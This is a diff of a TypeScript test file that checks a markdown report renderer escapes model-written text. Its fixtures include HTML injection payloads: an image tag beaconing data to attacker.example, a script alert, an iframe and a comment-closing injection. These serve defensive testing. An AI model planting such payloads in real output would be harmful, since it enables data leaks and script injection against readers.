@@ -440,28 +440,37 @@ describe("markdownEnhancedRenderer", () => {
 // ---------------------------------------------------------------------------
 
 describe("renderMarkdownEnhanced — model text cannot become markup", () => {
-  test("raw HTML in a section, a claim or a title is written inert", () => {
+  /** A brief and its first section, which every test below edits. */
+  function briefAndFirstSection() {
     const brief = makeBrief();
-    brief.synthesis.sections[0]!.content_markdown = 'Margins held. <img src="https://attacker.example/b?d=1">';
-    brief.synthesis.sections[0]!.title = "Intro <script>alert(1)</script>";
-    brief.research.findings[0]!.claim = "c1 <iframe src=https://attacker.example>";
+    const [first] = brief.synthesis.sections;
+    const [finding] = brief.research.findings;
+    if (first === undefined || finding === undefined) throw new Error("makeBrief has a section and a finding");
+    return { brief, first, finding };
+  }
+
+  test("raw HTML in a section, a claim or a title is written inert", () => {
+    const { brief, first, finding } = briefAndFirstSection();
+    first.content_markdown = 'Margins held. <img src="https://attacker.example/b?d=1">';
+    first.title = "Intro <script>alert(1)</script>";
+    finding.claim = "c1 <iframe src=https://attacker.example>";
     const md = renderMarkdownEnhanced(brief, { include_appendices: true });
     expect(md).not.toMatch(/<(img|script|iframe)/);
     expect(md).toContain('Margins held. &lt;img src="https://attacker.example/b?d=1">');
   });
 
   test("a validation issue cannot close the comment it is written in", () => {
-    const brief = makeBrief();
-    brief.synthesis.sections[0]!.validation_issues = ["fine --> # Injected heading"];
+    const { brief, first } = briefAndFirstSection();
+    first.validation_issues = ["fine --> # Injected heading"];
     const md = renderMarkdownEnhanced(brief);
     const comment = md.slice(md.indexOf("<!-- Validation issues:"));
     expect(comment.indexOf("-->")).toBe(comment.indexOf("\n-->") + 1);
   });
 
   test("a URL with parentheses or spaces stays one link target", () => {
-    const brief = makeBrief();
+    const { brief, first } = briefAndFirstSection();
     const source = { ...SRC_A, url: "https://example.org/wiki/Foo_(bar) x" };
-    brief.synthesis.sections[0]!.sources_cited = [source];
+    first.sources_cited = [source];
     const md = renderMarkdownEnhanced(brief);
     expect(md).toContain("[Reuters article A](https://example.org/wiki/Foo_%28bar%29%20x)");
   });
